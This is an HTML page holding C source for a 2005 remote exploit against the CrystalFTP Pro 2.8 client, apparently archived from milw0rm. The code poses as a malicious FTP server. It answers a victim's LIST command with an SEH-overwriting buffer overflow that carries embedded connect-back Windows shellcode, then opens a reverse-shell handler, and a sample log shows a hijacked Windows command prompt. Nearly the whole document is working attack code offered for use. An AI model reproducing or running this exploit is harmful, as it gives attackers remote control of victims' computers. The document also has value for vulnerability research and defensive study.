<html><head><title>CrystalFTP Pro 2.8 Remote Buffer Overflow Exploit</title></head><pre>/*
 * CrystalFTP Pro v2.8 Buffer Overflow Exploit
 *
 * 04/25/2005
 *
 * despite the fact that nobody uses CrystalFTP
 * i had to release a new version that replaces
 * the first one.
 *
 * this overwrites the structured exception handler
 * with a &quot;pop edx pop eax ret&quot; in kernel32.dll.
 * this takes us to a pointer of the next SEH.
 * just jmp over the SEH itself and reverse code
 * gets executed.
 *
 * add more targets if needed
 *
 * have phun
 *
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ local IP: 192.168.2.102
 * --[ incomming connection from:   192.168.2.103
 * --[ sending welcome message...done!
 * --[ getting login information
 * --[ reading USER...done!
 * --[ reading PASS...done!
 *         USER LOGGED IN!
 * --[ proceeding...
 * --[ reading cmd...done!
 * --[ reading cmd...done!
 * --[ reading cmd...done!
 * --[ entering passive mode...
 * --[ passive connection established!
 * --[ reading cmd...done!
 * --[ user is trying to use &quot;LIST&quot; command
 * --[ w00d w00d, let`s kick his ass...
 * --[ sending packet [ 711 bytes ]...done!
 * --[ confirming...done!
 * --[ starting reverse handler [port: 1337]...done!
 * --[ incomming connection from:   192.168.2.103
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\crystalFTP&gt;
 *
 */

#include &lt;stdio.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

/*
 *
 * definitions
 *
 */

#define RED		&quot;\E[31m\E[1m&quot;
#define GREEN	&quot;\E[32m\E[1m&quot;
#define YELLOW	&quot;\E[33m\E[1m&quot;
#define BLUE	&quot;\E[34m\E[1m&quot;
#define NORMAL	&quot;\E[m&quot;

#define PORT	21
#define PASV	31337
#define BACKLOG	5

/*
 *
 * prototypes
 *
 */

int isip ( char* ip );
int shell ( int s, char* tip, unsigned short cbport );

char* get_cmd ( int s );

void auth ( int s );
void handle_cmd ( int s, int connfd, char* ip );
void header ();
void start_reverse_handler ();

/*********************
 * Windows Shellcode *
 *********************/

/*
 * Type  : connect back shellcode
 * Length: 316 bytes
 * CBIP  : reverseshell[111] ( ^ 0x99999999 )
 * CBPort: reverseshell[118] ( ^ 0x9999 )
 *
 */

unsigned char reverseshell[] =
&quot;\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA&quot;
&quot;\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9&quot;
&quot;\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3&quot;
&quot;\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE&quot;
&quot;\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99&quot;
&quot;\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF&quot;
&quot;\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6&quot;
&quot;\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF&quot;
&quot;\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD&quot;
&quot;\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD&quot;
&quot;\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD&quot;
&quot;\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66&quot;
&quot;\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66&quot;
&quot;\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB&quot;
&quot;\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3&quot;
&quot;\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3&quot;
&quot;\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D&quot;
&quot;\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75&quot;
&quot;\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2&quot;
&quot;\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0&quot;;

unsigned char head[] =
&quot;\x2d\x72\x77\x2d\x72\x2d\x2d\x72\x2d\x2d\x20\x20\x20\x20\x20\x20&quot;
&quot;\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&quot;
&quot;\x20\x20\x20\x20\x20\x20\x20\x20\x32\x39\x20\x44\x65\x63\x20\x32&quot;
&quot;\x32\x20\x31\x33\x3a\x33\x37\x20\x63\x79\x62\x65\x72\x74\x72\x6f&quot;
&quot;\x6e\x69\x63\x2e&quot;;

char* argv3 = NULL;

/*
 *
 * functions
 *
 */

int
isip ( char* ip )
{
	unsigned int a, b, c, d;

	sscanf ( ip, &quot;%d.%d.%d.%d&quot;, &amp;a, &amp;b, &amp;c, &amp;d );
	if ( a &lt; 1 || a &gt; 255 )
		return ( 1 );
	if ( b &lt; 0 || b &gt; 255 )
		return ( 1 );
	if ( c &lt; 0 || c &gt; 255 )
		return ( 1 );
	if ( d &lt; 0 || d &gt; 255 )
		return ( 1 );
	return ( 0 );
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( &quot;--[&quot; YELLOW &quot; b&quot; NORMAL &quot;0&quot; YELLOW &quot;x &quot; NORMAL &quot;p&quot; YELLOW &quot;w&quot; NORMAL &quot;n&quot; YELLOW &quot;e&quot; NORMAL &quot;d &quot; YELLOW &quot;- &quot; NORMAL &quot;h&quot; YELLOW &quot;4&quot; NORMAL &quot;v&quot; YELLOW &quot;e &quot; NORMAL &quot;p&quot; YELLOW &quot;h&quot; NORMAL &quot;u&quot; YELLOW &quot;n&quot; NORMAL &quot;\n&quot; );

	FD_ZERO ( &amp;fd_read );
	FD_SET ( s, &amp;fd_read );
	FD_SET ( 0, &amp;fd_read );

	while ( 1 )
	{
		FD_SET ( s, &amp;fd_read );
		FD_SET ( 0, &amp;fd_read );

		if ( select ( s + 1, &amp;fd_read, NULL, NULL, NULL ) &lt; 0 )
			break;
		if ( FD_ISSET ( s, &amp;fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
			if ( write ( 1, buffer, n ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
		}
		if ( FD_ISSET ( 0, &amp;fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
			if ( send ( s, buffer, n, 0 ) &lt; 0 )
			{
				printf ( &quot;bye bye...\n&quot; );
				return;
			}
		}
		usleep(10);
	}
}

char*
get_cmd ( int s )
{
	static char cmd[32];
	printf ( &quot;--[&quot; YELLOW &quot; reading cmd...&quot; NORMAL );
	if ( read ( s, cmd, 32 ) &lt;= 0 )
	{
		printf ( RED &quot;failed!\n&quot; NORMAL);
		exit ( 1 );
	}
	printf ( GREEN &quot;done!\n&quot; NORMAL );
	return ( cmd );
}

void
auth ( int s )
{
	char user[32], pass[32], out[128];

	printf ( &quot;--[ sending welcome message...&quot; );
	bzero ( &amp;out, 128 );
	strcpy ( out, &quot;220 cybertronicFTP v0.2\r\n&quot; );
	if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
	{
		printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
		exit ( 1 );
	}
	printf ( GREEN &quot;done!\n&quot; NORMAL );
	printf ( &quot;--[ getting login information\n&quot; );
	printf ( &quot;--[&quot; YELLOW &quot; reading USER...&quot; NORMAL );
	sleep ( 1 );
	if ( read ( s, user, 32 ) &lt;= 0 )
	{
		printf ( RED &quot;failed!\n&quot; NORMAL );
		exit ( 1 );
	}
	printf ( GREEN &quot;done!\n&quot; NORMAL );
	sleep ( 1 );
	bzero ( &amp;out, 128 );
	strcpy ( out, &quot;331 Anonymous FTP server\r\n&quot; );
	if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
	{
		printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
		exit ( 1 );
	}
	printf ( &quot;--[&quot; YELLOW &quot; reading PASS...&quot; NORMAL );
	sleep ( 1 );
	if ( read ( s, pass, 32 ) &lt;= 0 )
	{
		printf ( RED &quot;failed\n&quot; NORMAL );
		exit ( 1 );
	}
	printf ( GREEN &quot;done!\n&quot; NORMAL );
	sleep ( 1 );
	bzero ( &amp;out, 128 );
	strcpy ( out, &quot;230 Login successful!\r\n&quot; );
	if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
	{
		printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
		exit ( 1 );
	}
	printf ( GREEN &quot;\tUSER LOGGED IN!\n&quot; NORMAL );
	printf ( &quot;--[ proceeding...\n&quot; );
}

void
handle_cmd ( int s, int s2, char* ip )
{
	int listenfd, connfd;
	int i = 1;
	int tmp[4];
	unsigned long ret = 0x77ea5794;		//edx eax ret	in kernel32.dll
	char* a = NULL;
	char* cmd;
	char out[128], buffer[1024], addr[32];
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	while ( 1 )
	{
		cmd = get_cmd ( s );
		if ( strncmp ( cmd, &quot;PWD&quot;, 3 ) == 0 )
		{
			bzero ( &amp;out, 128 );
			strcpy ( out, &quot;257 \&quot;/\&quot; is current directory.\r\n&quot; );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
		}
		else if ( strncmp ( cmd, &quot;CWD&quot;, 3 ) == 0 )
		{
			bzero ( &amp;out, 128 );
			strcpy ( out, &quot;257 \&quot;/\&quot; is current directory.\r\n&quot; );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
		}
		else if ( strncmp ( cmd, &quot;TYPE&quot;, 4 ) == 0 )
		{
			bzero ( &amp;out, 128 );
			strcpy ( out, &quot;200 Type set to A..\r\n&quot; );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
		}
		else if ( strncmp ( cmd, &quot;PASV&quot;, 4 ) == 0 )
		{
			bzero ( &amp;addr, 32 );
			a = ( char* ) strtok ( ip, &quot;.&quot; );
			tmp[0] = ( int ) a;
			while ( a != NULL )
			{
				a = ( char* ) strtok ( NULL, &quot;.&quot; );
				tmp[i] = ( int )a;
				i++;
			}
			bzero ( &amp;out, 128 );
			sprintf( out, &quot;227 Entering Passive Mode. (%s,%s,%s,%s,122,105).\r\n&quot;, tmp[0], tmp[1], tmp[2], tmp[3] );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
			printf ( &quot;--[ entering passive mode...\n&quot; );
			if ( ( listenfd = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
			{
        			printf ( RED &quot;socket failed!\n&quot; NORMAL );
        			exit ( 1 );
			}
			bzero ( &amp;servaddr, sizeof ( servaddr ) );
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
			servaddr.sin_port = htons ( PASV );
			bind ( listenfd, ( struct sockaddr * ) &amp;servaddr, sizeof ( servaddr ) );
			if ( listen ( listenfd, 1 ) == -1 )
			{
				printf ( RED &quot;listen failed!\n&quot; NORMAL );
				exit ( 1 );
			}
			clilen = sizeof ( cliaddr );
			if ( ( connfd = accept ( listenfd, ( struct sockaddr * ) &amp;cliaddr, &amp;clilen ) ) &lt; 0 )
			{
				close ( listenfd );
				printf ( RED &quot;accept failed!\n&quot; NORMAL );
				exit ( 1 );
			}
			close ( listenfd );
			printf ( &quot;--[&quot; GREEN &quot; passive connection established!\n&quot; NORMAL );
			handle_cmd ( s, connfd, addr );
		}
		else if ( strncmp ( cmd, &quot;LIST&quot;, 4 ) == 0 )
		{
			printf ( &quot;--[&quot; GREEN &quot; user is trying to use \&quot;LIST\&quot; command\n&quot; NORMAL );
			printf ( &quot;--[ w00d w00d, let`s kick his ass...\n&quot; );
			bzero ( &amp;buffer, 1024 );
			memcpy ( buffer, head, sizeof ( head ) - 1 );
			memset ( buffer + 68, 0x90, 255 );
			memcpy ( buffer + 321, &quot;\xeb\x46&quot;, 2 );
			strncat ( buffer, ( unsigned char * ) &amp;ret, 4 );
			memset ( buffer + 327, 0x90, 66 );
			memcpy ( buffer + 393, reverseshell, sizeof ( reverseshell ) - 1 );
			strcat ( buffer, &quot;\r\n&quot; );
			bzero ( &amp;out, 128 );
			strcpy ( out, &quot;150 Here comes the directory listing.\r\n&quot; );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
			printf ( &quot;--[ sending packet [ %d bytes ]...&quot;, strlen ( buffer ) );
			if ( write ( s2, buffer, strlen ( buffer ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
			printf ( GREEN &quot;done!\n&quot; NORMAL);
			bzero ( &amp;out, 128 );
			strcpy ( out, &quot;226 Transfer ok\r\n&quot; );
			printf ( &quot;--[ confirming...&quot; );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
			printf ( GREEN &quot;done!\n&quot; NORMAL);
			close ( s2 );
			start_reverse_handler ( argv3 );
		}
		else
		{
			bzero ( &amp;out, 128 );
			strcpy ( out, &quot;550 command not supported\r\n&quot; );
			if ( write ( s, out, strlen ( out ) ) &lt;= 0 )
			{
				printf ( RED &quot;\twrite failed!\n&quot; NORMAL );
				exit ( 1 );
			}
		}
	}
}

void
header ()
{
	printf ( &quot;              __              __                   _           \n&quot; );
	printf ( &quot;  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n&quot; );
	printf ( &quot; / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n&quot; );
	printf ( &quot;/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n&quot; );
	printf ( &quot;\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n&quot; );
	printf ( &quot;    /____/                                                     \n\n&quot; );
	printf ( &quot;--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n&quot; );
}

void
start_reverse_handler ()
{
	int s1, s2;
	unsigned short cbport;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	sscanf ( argv3, &quot;%u&quot;, &amp;cbport );
	
	bzero ( &amp;servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( &quot;--[ starting reverse handler [port: %u]...&quot;, cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( &quot;socket failed!\n&quot; );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &amp;servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( &quot;listen failed!\n&quot; );
		exit ( 1 );
	}
	printf ( YELLOW &quot;done!\n&quot; NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &amp;cliaddr, &amp;clilen ) ) &lt; 0 )
	{
		printf ( &quot;accept failed!\n&quot; );
		exit ( 1 );
	}
	close ( s1 );
	printf ( &quot;--[&quot; GREEN &quot; incomming connection from:\t&quot; YELLOW &quot; %s\n&quot; NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

int
main ( int argc, char* argv[] )
{
	int listenfd, connfd;
	unsigned long xoredip;
	unsigned short xoredcbport;
	char* ip;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	if ( argc != 3 )
	{
		printf ( RED &quot;--[ usage: %s &lt;connectback ip&gt; &lt;connectback port&gt;\n&quot; NORMAL, argv[0] );
		exit ( 1 );
	}
	if ( isip ( argv[1] ) != 0 )
	{
		printf ( RED &quot;--[ enter a valid IP\n&quot; NORMAL );
		exit ( 1 );
	}
	system ( &quot;clear&quot; );
	header ();
	argv3 = argv[2];
	xoredip = inet_addr ( argv[1] ) ^ ( unsigned long ) 0x99999999;
	xoredcbport = htons ( atoi ( argv[2] ) ) ^ ( unsigned short ) 0x9999;
	memcpy ( &amp;reverseshell[111], &amp;xoredip, 4);
	memcpy ( &amp;reverseshell[118], &amp;xoredcbport, 2);
	if ( ( listenfd = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
        	printf ( RED &quot;socket failed!\n&quot; NORMAL );
        	exit ( 1 );
	}
	bzero ( &amp;servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );
	bind ( listenfd, ( struct sockaddr * ) &amp;servaddr, sizeof ( servaddr ) );
	if ( listen ( listenfd, BACKLOG ) == -1 )
	{
		printf ( RED &quot;listen failed!\n&quot; NORMAL );
		exit ( 1 );
	}
	for ( ; ; )
	{
		clilen = sizeof ( cliaddr );
		if ( ( connfd = accept ( listenfd, ( struct sockaddr * ) &amp;cliaddr, &amp;clilen ) ) &lt; 0 )
		{
			close ( listenfd );
			printf ( RED &quot;accept failed!\n&quot; NORMAL );
			exit ( 1 );
		}
		if ( ( childpid = fork ( ) ) == 0 )
		{
			close ( listenfd );
			ip = ( char* ) ( argv[1] );
			printf ( &quot;--[ local IP: %s\n&quot;, ip );
			printf ( &quot;--[&quot; GREEN &quot; incomming connection from:\t&quot; YELLOW &quot; %s\n&quot; NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
			auth ( connfd );
			handle_cmd ( connfd, ( int ) NULL, ip );
		}
		close ( connfd );
	}
}

// milw0rm.com [2005-04-24]</pre></html>